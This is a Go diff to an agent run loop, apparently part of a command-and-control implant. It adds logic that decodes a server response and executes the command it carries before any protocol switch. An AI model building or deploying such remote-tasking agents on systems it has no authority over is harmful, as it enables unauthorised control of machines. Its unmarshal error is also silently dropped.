@@ -3,6 +3,7 @@ package runloop
 import (
 	"context"
 	"encoding/json"
+	"fmt"
 	"log"
 	"math/rand"
 	"time"
@@ -34,7 +35,24 @@ func RunLoop(ctx context.Context, comm models.Agent, cfg *config.Config) error {
 			continue // Skip to next iteration
 		}
 
-		// BASED ON PROTOCOL, HANDLE PARSING DIFFERENTLY
+		// Let's FIRST handle command
+		// This way it's performed before switching - in case a switch was also requested
+		// Remember this ONLY happens if https, otherwise just ignore
+
+		if currentProtocol == "https" {
+			var httpsResp https.HTTPSResponse
+			if err := json.Unmarshal(response, &httpsResp); err != nil {
+				fmt.Errorf("could not unmarshal response: %v", err)
+			}
+
+			if httpsResp.Job {
+				log.Printf("Received command: %s", httpsResp.Command)
+				executeTask(httpsResp)
+			} else {
+				log.Println("There was no command from the server")
+			}
+
+		}
 
 		// Check if this is a transition signal
 		if detectTransition(currentProtocol, response) {
